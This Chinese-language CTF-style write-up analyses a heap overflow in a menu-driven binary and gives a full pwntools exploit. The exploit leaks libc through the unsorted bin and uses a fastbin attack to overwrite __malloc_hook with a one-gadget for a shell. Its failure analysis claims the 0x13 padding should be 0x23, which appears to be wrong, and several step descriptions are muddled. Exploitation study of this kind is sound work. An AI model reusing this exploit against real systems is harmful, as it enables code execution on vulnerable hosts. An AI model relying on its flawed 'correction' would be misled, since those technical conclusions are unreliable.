## 漏洞成因

### 关键结构体分析
程序使用以下结构体管理堆块：
```c
struct chunk {
    int in_use;        // 是否正在使用 (4字节)
    size_t size;       // 块大小 (8字节)  
    void *data;        // 数据指针 (8字节)
};
// 总共24字节，以数组形式存储在mmap区域
```

### 漏洞位置与类型
- **漏洞函数**：`sub_E7F`（Fill功能）
- **漏洞类型**：堆溢出（Heap Overflow）
- **漏洞代码分析**：
```c
printf("Size: ");
result = sub_138C();  // 读取用户输入的大小
v3 = result;
if ( (int)result > 0 )
{
    printf("Content: ");
    return sub_11B2(*(_QWORD *)(24LL * v2 + a1 + 16), v3); // 直接使用用户控制的大小
}
```

### 漏洞根本原因
1. **缺乏边界检查**：Fill功能允许用户指定任意大小的数据填充堆块，但没有验证输入大小是否小于等于堆块实际分配大小。
2. **直接内存写入**：使用用户控制的`v3`大小直接调用`sub_11B2`进行数据读取，导致可以写入超出分配边界的数据。
3. **利用后果**：攻击者可以通过溢出覆盖相邻堆块的元数据（如size字段、数据指针），进而实现任意地址读写和代码执行。

## 漏洞利用过程

### 利用步骤与内存变化

| 步骤 | 操作 | 内存关键变化 | 利用目的 |
|------|------|--------------|----------|
| 1 | `alloc(0x10);alloc(0x10);alloc(0x30);alloc(0x40);alloc(0x60)` | 初始化堆布局，分配5个堆块，建立攻击基础 | 创建可控的堆环境 |
| 2 | `fill(0, p64(0x51)*4); fill(2, p64(0x31)*6)` | 索引0溢出覆盖索引1的堆元数据：size从0x31变为0x51 | 伪造堆块大小，为fastbin攻击做准备 |
| 3 | `free(1)` | 索引1进入fastbin（0x50 bin），但结构体认为仍在用 | 创建UAF（Use-After-Free）条件 |
| 4 | `alloc(0x40)` | 索引0的size被修改为0x40，但实际堆块只有0x10 | 创建越界读写能力 |
| 5 | `fill(1, p64(0x91)*4)` | 索引1数据区域填充0x91模式 | 准备后续堆布局 |
| 6 | `free(2)` | 索引2进入unsortedbin，fd/bk指向main_arena+88 | 泄露libc地址 |
| 7 | `dump(1); ... malloc_hook计算` | 通过unsortedbin泄露libc基址，计算malloc_hook地址 | 获取关键函数地址 |
| 8 | `free(4)` | 释放索引4，为fake chunk准备空间 | 清理堆布局 |
| 9 | `fill(3, payload)` | 在索引3构造fake chunk：size=0x71, fd=malloc_hook-0x23 | 建立指向malloc_hook的fastbin链 |
| 10 | `alloc(0x60);alloc(0x60)` | 分配fake chunk，索引4获得malloc_hook-0x23控制权 | 实现任意地址分配 |
| 11 | `fill(4, shllcode)` | 尝试覆盖malloc_hook为one-gadget地址 | 准备代码执行 |
| 12 | `alloc(1); p.sendline(b'bash')` | 触发malloc调用，尝试执行shell | 获取shell权限 |
| 13 | `p.interactive()` | 利用失败，程序继续正常执行 | 交互模式 |

### 堆内存布局演变
- **初始状态**：连续分配的堆块，元数据完整
- **溢出后**：索引1的size被篡改，fastbin链污染
- **泄露阶段**：unsortedbin包含libc指针
- **攻击阶段**：fake chunk指向malloc_hook，准备劫持控制流
- **失败原因**：填充偏移错误（0x13 vs 0x23），malloc_hook未被正确覆盖

## Exploit

```python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = process('./data/sample7')
elf = ELF('./data/sample7')
libc = elf.libc

def alloc(size):
    p.recvuntil(b'Command: ')
    p.sendline(b'1')
    p.sendline(str(size).encode())

def fill(idx, payload):
    p.recvuntil(b'Command: ')
    p.sendline(b'2') 
    p.sendline(str(idx).encode())
    p.sendline(str(len(payload)).encode())
    p.send(payload)

def free(idx):
    p.recvuntil(b'Command: ')
    p.sendline(b'3')
    p.sendline(str(idx).encode())

def dump(idx):
    p.recvuntil(b'Command: ')
    p.sendline(b'4')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Content: \n')

# 步骤1: 初始化堆布局
alloc(0x10)  # 索引0 - 用于溢出攻击
alloc(0x10)  # 索引1 - 目标堆块，将被溢出覆盖
alloc(0x30)  # 索引2 - 用于libc泄露
alloc(0x40)  # 索引3 - 用于构造fake chunk
alloc(0x60)  # 索引4 - 辅助堆块

# 步骤2: 触发堆溢出，篡改相邻堆块元数据
fill(0, p64(0x51)*4)  # 溢出索引0，覆盖索引1的size为0x51
fill(2, p64(0x31)*6)  # 正常填充索引2

# 步骤3: 释放被篡改的堆块，进入fastbin
free(1)  # 索引1进入0x50 fastbin，但结构体认为仍在用

# 步骤4: 重新分配，利用篡改的size
alloc(0x40)  # 重新分配索引0，size被修改为0x40

# 步骤5: 填充释放的堆块，准备后续操作
fill(1, p64(0x91)*4)  # 填充索引1为0x91模式

# 步骤6: 释放大堆块进入unsortedbin，泄露libc地址
free(2)  # 索引2进入unsortedbin，包含main_arena指针

# 步骤7: 泄露libc地址并计算关键函数地址
dump(1)
p.recv(0x20)
SBaddr = u64(p.recv(8))  # 从unsortedbin泄露main_arena+88地址
p.recvline()
malloc_hook = SBaddr - 88 - 0x10  # 计算malloc_hook地址
libc_base = malloc_hook - libc.symbols['__malloc_hook']  # 计算libc基址
one_gadget = libc_base + 0x4527a  # one-gadget地址（需根据实际libc调整）

# 步骤8: 释放辅助堆块
free(4)

# 步骤9: 构造fake chunk指向malloc_hook附近
payload = p64(0)*9 + p64(0x71) + p64(malloc_hook - 0x23)
fill(3, payload)  # 在索引3布置fake chunk

# 步骤10: 分配fake chunk，获得malloc_hook控制权
alloc(0x60)  # 消耗fastbin链
alloc(0x60)  # 分配得到malloc_hook-0x23的控制权（索引4）

# 步骤11: 覆盖malloc_hook为one-gadget（但偏移计算错误）
# 错误：使用b'a'*0x13，正确应为b'a'*0x23
payload = p64(one_gadget)
shllcode = b'a'*0x13 + payload  # 错误偏移，导致覆盖位置错误
fill(4, shllcode)  # 尝试覆盖malloc_hook

# 步骤12: 触发malloc调用，尝试执行shell
alloc(1)  # 触发malloc，但由于覆盖失败，不会执行one-gadget
p.sendline(b'bash')  # 发送命令

# 步骤13: 进入交互模式（利用失败）
p.interactive()

# 修正方案：
# 将步骤11的填充偏移改为0x23：
# shllcode = b'a'*0x23 + p64(one_gadget)
# 这样one-gadget地址将正确覆盖malloc_hook位置
```

### 利用失败分析与修正
- **失败原因**：在步骤11中，填充偏移计算错误。从malloc_hook-0x23到malloc_hook需要0x23字节填充，但代码中使用了0x13字节。
- **修正方法**：将`shllcode = b'a'*0x13 + payload`改为`shllcode = b'a'*0x23 + payload`。
- **验证方法**：修正后，再次执行exp，应能成功覆盖malloc_hook并获取shell权限。
